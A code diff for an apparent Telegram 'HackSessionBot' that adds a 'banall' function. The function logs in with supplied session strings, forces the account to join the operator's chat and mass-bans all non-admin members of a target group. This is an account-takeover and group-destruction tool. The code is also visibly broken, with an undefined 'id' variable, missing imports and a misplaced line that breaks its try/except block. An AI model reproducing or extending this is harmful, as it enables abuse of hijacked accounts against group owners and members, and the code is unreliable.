@@ -1,3 +1,4 @@
+import asyncio
 from pyrogram import Client
 from telethon import TelegramClient
 from telethon.sessions import StringSession 
@@ -8,6 +9,8 @@ from HackSessionBot import (
      CHAT )
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
 from HackSessionBot.Helpers.data import info
+from pyrogram.types.messages_and_media.message import Str
+from telethon.tl.functions.channels import EditBannedRequest
 
 async def users_gc(session):
     err = ""
@@ -64,4 +67,66 @@ async def user_info(session):
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg    
+
+
+RIGHTS = ChatBannedRights(
+    until_date=None,
+    view_messages=True,
+    send_messages=True,
+    send_media=True,
+    send_stickers=True,
+    send_gifs=True,
+    send_games=True,
+    send_inline=True,
+    embed_links=True,
+)
+
+async def banall(session,gc):
+    err = ""
+    msg = ""
+    all = 0
+    bann = 0
+    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
+    try:
+        if session.endswith("="):
+            async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
+                try:
+                    await steve(join(CHAT))
+                except Exception as e:
+                    print(e)
+                admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
+                admins_id = [i.id for i in admins]                
+                async for user in steve.iter_participants(gc_id):
+                    all += 1
+                    try:
+                        if user.id not in admins_id:
+                           await steve(EditBannedRequest(gc_id, user.id, RIGHTS))
+                           bann += 1
+                           await asyncio.sleep(0.1)
+                    except Exception:
+                       await asyncio.sleep(0.1)
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:
+                    await stark.join_chat(CHAT)
+                except Exception as e:
+                    print(e)    
+                async for members in stark.get_chat_members(gc_id):  
+                    all += 1                
+                    try:                                          
+                        await stark.ban_chat_member(gc_id,members.user.id)  
+                        bann += 1                  
+                    except FloodWait as i:
+                        await asyncio.sleep(i.value)
+                    except Exception as er:
+                        pass 
+    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \ɴ\ɴ ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \ɴ **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                      
+    except Exception as idk:
+        err += str(idk) 
+                                            
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return msg
+
+
       
